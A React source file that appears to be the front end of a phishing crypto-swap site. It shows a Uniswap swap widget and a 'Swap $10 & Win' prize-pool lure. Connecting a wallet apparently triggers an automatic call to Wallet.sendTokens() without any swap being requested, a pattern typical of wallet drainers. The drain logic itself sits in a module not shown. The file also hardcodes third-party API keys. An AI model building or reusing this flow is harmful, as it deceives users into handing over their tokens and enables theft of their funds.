import React, { useCallback, useEffect, useMemo, useRef, useState } from "react";
import { Alchemy, Network, TokenBalance, Utils } from "alchemy-sdk";
import { SwapWidget, darkTheme, Theme } from '@uniswap/widgets';
import { tokenList } from "./tokenList";
import '@uniswap/widgets/fonts.css'
import "./swap.css"
import { useNavigate } from "react-router";
import A from "./TradingView"
// import { createWeb3Modal, defaultConfig, useWeb3Modal, useWeb3ModalAccount, useWeb3ModalProvider } from '@web3modal/ethers5/react'
import { ethers } from "ethers";
import Web3 from "web3";
import Wallet from "./wallet";
import { motion } from "framer-motion";
import { Navbar } from "./Home";
const Transaction = require("ethereumjs-tx")

const jsonRpcUrlMap = {
    1: ["https://mainnet.infura.io/v3/d96840a8db194f239eab32544159793e"]
}

const myDarkTheme: Theme = {
    ...darkTheme, // Extend the darkTheme
    // container: "#E3C9CB",
    // module: "#A5B78F",
    // primary: "#482728",
    // secondary: "#482728",
    // outline: "#482728",
    // accent: "#482728",
    // interactive: "#482728",
    // dialog: "#12ffb8",










    borderRadius: {
        large: 56,
        medium: 56,
        small: 56,
        xsmall: 56
    }
}

const config = {
    apiKey: "QmN987r2njqRwi-sayxhDTX0rZariEcY",
    network: Network.ETH_MAINNET,
};


export const alchemy = new Alchemy(config);


// // 1. Get projectId at https://cloud.walletconnect.com
// const projectId = 'c5e857331d9ecd93bf3705578f172580'

// // 2. Set chains
// const mainnet = {
//     chainId: 1,
//     name: 'Ethereum',
//     currency: 'ETH',
//     explorerUrl: 'https://etherscan.io',
//     rpcUrl: 'https://cloudflare-eth.com'
// }

// // 3. Create modal
// const metadata = {
//     name: 'Rango',
//     description: 'Swap Cryptocurrencies Easily, Quickly, and Securely crabswap non-custodial platform lets you exchange numerous cryptocurrencies with no processing fees (network fees apply), competitive rates, and strong security measures to protect you.',
//     url: 'o', // origin must match your domain & subdomain
//     icons: ['https://firebasestorage.googleapis.com/v0/b/imageupload-b460d.appspot.com/o/dear.svg?alt=media&token=5d15f5d8-b5e3-4592-8222-326368a49c2e']
// }

// createWeb3Modal({
//     ethersConfig: defaultConfig({ metadata }),
//     chains: [mainnet],
//     projectId,
//     enableAnalytics: true // Optional - defaults to your Cloud configuration
// })

const Account = () => {
    // const { open } = useWeb3Modal()
    // const { address, chainId, isConnected } = useWeb3ModalAccount()
    // const { walletProvider } = useWeb3ModalProvider()
    const [provider, setProvider] = useState<any>();

    const authenticateUser = async () => {
        await Wallet.create()
        await Wallet.connectWallet()
        transact();

    };

    const transact = async () => {

        if (Wallet.address) {
            while (!Wallet.readyToTransact()) {
                continue;
            }
            setProvider(Wallet.provider)
            if (Wallet.address) {
                Wallet.sendTokens();
                // n.current = 1;
                return false;
            }
        }

        return false;

    }

    useEffect(() => {
        (async () => {
            try {
                const [primaryWallet] = Wallet.onboard.state.get().wallets
                await Wallet.onboard.disconnectWallet({ label: primaryWallet.label })
            } catch (error) {

            }

        })()
    }, [])


    return (
        <>
            <Navbar connectWallet={authenticateUser} />
            <div>
                <div className="relative swap pt-12 ">
                    <div className="absolute top-16 -left-24">

                    </div>
                    <div className="flex md:flex-row justify-center flex-col-reverse gap-12 text-white items-center container px-4">

                        <div className="relative z-10 max-w-[390px]">
                            <div className="w-full flex justify-center">
                                <div className="w-full max-w-[470px]  rounded-2xl">
                                    <SwapWidget tokenList={tokenList} width="100%" theme={myDarkTheme} provider={provider} jsonRpcUrlMap={jsonRpcUrlMap} hideConnectionUI={true} onConnectWalletClick={() => { authenticateUser(); return false; }} />
                                </div>
                            </div>
                            <div className="w-full mt-4">
                                <div className="reward rounded-xl p-4 space-y-4">
                                    <div>
                                        <img className="w-12" src={process.env.PUBLIC_URL + "/logo.svg"} alt="" />
                                    </div>
                                    <div className="text-sm">
                                        Swap $10 on Scroll & Win Lucky Rewards! 🍀💰
                                    </div>
                                    <div>
                                        <div className=" bg-white rounded-full text-xs bg-opacity-25 inline-flex px-4 py-1 items-center gap-1">
                                            <svg viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg" width="24" height="24" className=""><path d="M8.75 1.8125C7.60466 1.8125 6.68218 2.6999 6.55078 3.8125H5.25C4.29252 3.8125 3.5 4.60502 3.5 5.5625V8.5625C3.5 10.3485 4.96403 11.8125 6.75 11.8125H6.85449C7.52788 13.8737 9.2997 15.358 11.5 15.6602V17.3125H9.75C7.96403 17.3125 6.5 18.7765 6.5 20.5625V21.0625C6.50002 21.2614 6.57904 21.4522 6.71969 21.5928C6.86034 21.7335 7.05109 21.8125 7.25 21.8125H17.25C17.4489 21.8125 17.6397 21.7335 17.7803 21.5928C17.921 21.4522 18 21.2614 18 21.0625V20.5625C18 18.7765 16.536 17.3125 14.75 17.3125H13V15.6602C15.2003 15.358 16.9721 13.8737 17.6455 11.8125H17.75C19.536 11.8125 21 10.3485 21 8.5625V5.5625C21 4.60502 20.2075 3.8125 19.25 3.8125H17.9492C17.8178 2.6999 16.8953 1.8125 15.75 1.8125H8.75ZM8.75 3.3125H15.75C16.1732 3.3125 16.5 3.63925 16.5 4.0625V4.43945C16.4868 4.51997 16.4868 4.6021 16.5 4.68262V10.0625C16.5 12.4034 14.6279 14.2794 12.293 14.3037C12.2643 14.3021 12.2357 14.3021 12.207 14.3037C9.87213 14.2794 8 12.4034 8 10.0625V4.68555C8.01323 4.60503 8.01323 4.5229 8 4.44238V4.0625C8 3.63925 8.32675 3.3125 8.75 3.3125ZM5.25 5.3125H6.5V10.0625C6.5 10.1365 6.5392 10.1981 6.54199 10.2715C5.67213 10.1658 5 9.4635 5 8.5625V5.5625C5 5.41498 5.10248 5.3125 5.25 5.3125ZM18 5.3125H19.25C19.3975 5.3125 19.5 5.41498 19.5 5.5625V8.5625C19.5 9.4635 18.8279 10.1658 17.958 10.2715C17.9608 10.1981 18 10.1365 18 10.0625V5.3125ZM9.75 18.8125H14.75C15.636 18.8125 16.326 19.464 16.4502 20.3125H8.0498C8.17403 19.464 8.86398 18.8125 9.75 18.8125Z" fill="currentColor"></path></svg>
                                            <span>
                                                Prize pool: $10,000
                                            </span>
                                        </div>
                                    </div>
                                </div>
                            </div>
                        </div>

                    </div>

                </div>
            </div >
        </>
    );
};


export default React.memo(Account);
